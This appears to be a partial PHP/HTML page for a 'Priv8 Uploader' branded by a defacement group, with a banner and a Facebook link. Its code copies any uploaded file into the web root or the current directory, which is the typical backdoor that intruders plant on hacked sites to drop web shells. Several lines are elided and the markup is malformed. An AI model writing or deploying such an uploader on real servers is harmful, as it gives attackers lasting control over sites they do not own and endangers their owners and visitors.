...
<center><br><img src="https://3.bp.blogspot.com/-q8tKPJ6QVjI/WtC0TZlCZjI/AAAAAAAAAYo/cNXVL1sbntsXVkbk-Bc926QDx_KustzZACLcBGAs/s1600/N45HT%2B%25282%2529.png" width="400" height="350"><center>
<body>

<font face= "Architects Daughter">
<font color='red' face='Architects Daughter' font size="5px"'>Priv8 Uploaders By En Banglasia!</font></b><center>
<?php
...
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
			...
			echo "<font color='red'Root Dir -> Failed!";
		}
	} else {
		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
			echo " Upload <b>$files</b> at this dir";
		} else {
			echo "Failed!";
		}
	}
...
<a href='https://www.facebook.com/nenekkaukeling/' target='_blank'><font size='3px'>About Us</a>
</body>
</html>
